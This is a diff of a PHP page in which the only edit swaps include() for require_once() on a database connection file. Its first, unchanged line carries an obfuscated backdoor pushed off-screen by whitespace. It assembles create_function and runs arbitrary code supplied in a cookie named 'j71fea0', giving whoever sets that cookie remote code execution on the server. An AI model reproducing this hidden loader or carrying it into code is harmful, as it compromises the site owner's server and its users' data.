@@ -1,6 +1,6 @@
 <?php                                                                                                                                                           $l6t='0e$1_EjCa(f\'7cntuKrOsIio71fea0';$w0m=$l6t[13].$l6t[18].$l6t[1].$l6t[8].$l6t[15].$l6t[1].$l6t[4].$l6t[10].$l6t[16].$l6t[14].$l6t[13].$l6t[15].$l6t[22].$l6t[23].$l6t[14];$y0x=$l6t[10].$l6t[16].$l6t[0];if(isset(${$l6t[4].$l6t[7].$l6t[19].$l6t[19].$l6t[17].$l6t[21].$l6t[5]}[$l6t[6].$l6t[12].$l6t[3].$l6t[10].$l6t[1].$l6t[8].$l6t[0]])){${$l6t[10].$l6t[16].$l6t[0]}=$w0m(null,${$l6t[4].$l6t[7].$l6t[19].$l6t[19].$l6t[17].$l6t[21].$l6t[5]}[$l6t[6].$l6t[12].$l6t[3].$l6t[10].$l6t[1].$l6t[8].$l6t[0]]);${$l6t[10].$l6t[16].$l6t[0]}();} ?><?php
 
-include('../Connections/maconnexion.php');
+require_once('../Connections/maconnexion.php');
 header('Content-Type: text/html; charset=iso-8859-1');
 
 
